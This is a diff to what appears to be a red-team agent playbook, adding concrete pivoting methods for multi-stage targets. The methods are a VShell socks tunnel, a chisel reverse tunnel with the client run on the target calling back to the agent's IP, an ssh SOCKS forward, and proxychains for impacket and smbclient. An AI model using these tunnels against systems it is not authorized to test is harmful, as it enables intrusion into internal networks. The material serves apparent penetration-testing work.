@@ -32,10 +32,19 @@ Treat a target as multi-stage when any of these is true:
    services (`ip addr`, `/etc/hosts`, cloud metadata, config files listing
    backends, `nmap -Pn` on the internal ranges the target reveals). Record every
    internal address with how you learned it.
-4. **Pivot.** Reach the internal service with a forward (`ssh -L`,
-   `socat`, `chisel`) or by replaying an internal URL through the SSRF. Keep the
-   pivot command in your notes; a re-established tunnel is much cheaper than
-   rediscovering the foothold.
+4. **Pivot.** Reach the internal service with a forward or by replaying an
+   internal URL through the SSRF. Working options in this image:
+
+   - VShell: `add_tunnel` (socks5) bound to an online host -> local port.
+   - chisel: `chisel server -p 8080 --reverse` in the agent container, then
+     `chisel client <agent-ip>:8080 R:socks` on the target -> local 1080.
+   - ssh: `ssh -D 1080 -N user@host` once credentials exist.
+   - For tools that cannot speak SOCKS (smbclient, impacket, redis-cli):
+     `proxychains4 -f /opt/red-harness/proxychains.conf <tool>` with the last
+     line of the config pointing at your tunnel port.
+
+   Keep the pivot command in your notes; a re-established tunnel is much
+   cheaper than rediscovering the foothold.
 5. **Escalate stage by stage.** Each stage's output becomes the next stage's
    input (credential, token, internal URL, file). Verify each stage's result
    before moving on; a failed assumption at stage 2 wastes all later work.
